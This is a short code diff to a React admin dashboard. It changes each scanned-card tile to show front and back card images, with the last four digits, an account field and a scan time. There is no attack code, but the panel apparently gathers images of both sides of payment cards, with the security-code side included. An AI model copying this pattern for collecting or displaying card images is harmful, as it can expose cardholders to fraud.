@@ -152,12 +152,18 @@ export default function AdminDashboard() {
               <div className="grid grid-cols-2 sm:grid-cols-3 p-4 gap-3">
                 {scans.map(s => (
                   <div key={s.id} className="rounded-xl border border-black/5 overflow-hidden bg-black/2">
-                    <div className="aspect-[16/9] overflow-hidden bg-[#0d1020] relative">
-                      <img src={s.image} alt="Scanned card" className="w-full h-full object-cover opacity-90" loading="lazy" />
-                      <span className="absolute top-2 left-2 text-[9px] px-2 py-0.5 rounded-full bg-black/55 text-white font-mono">•••• {s.last4}</span>
+                    <div className="grid grid-cols-2 gap-1 p-1 bg-[#0d1020]">
+                      {(s.images && s.images.length > 0 ? s.images : [s.image]).slice(0, 2).map((src, i) => (
+                        <div key={i} className="aspect-[16/9] overflow-hidden relative">
+                          <img src={src} alt={i === 0 ? 'Card front' : 'Card back'} className="w-full h-full object-cover opacity-90" loading="lazy" />
+                          <span className="absolute top-1 left-1 text-[9px] px-2 py-0.5 rounded-full bg-black/55 text-white font-mono">
+                            {i === 0 ? 'Front' : 'Back'}
+                          </span>
+                        </div>
+                      ))}
                     </div>
                     <div className="px-3 py-2.5">
-                      <p className="text-[11px] text-black/70 font-medium truncate">{s.label}</p>
+                      <p className="text-[11px] text-black/70 font-medium truncate">{s.label}, ···· {s.last4}</p>
                       <p className="text-[10px] text-black/30 font-mono truncate">{s.account}</p>
                       <p className="text-[9px] text-black/25 font-mono">{new Date(s.at).toLocaleString('en', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' })}</p>
                     </div>
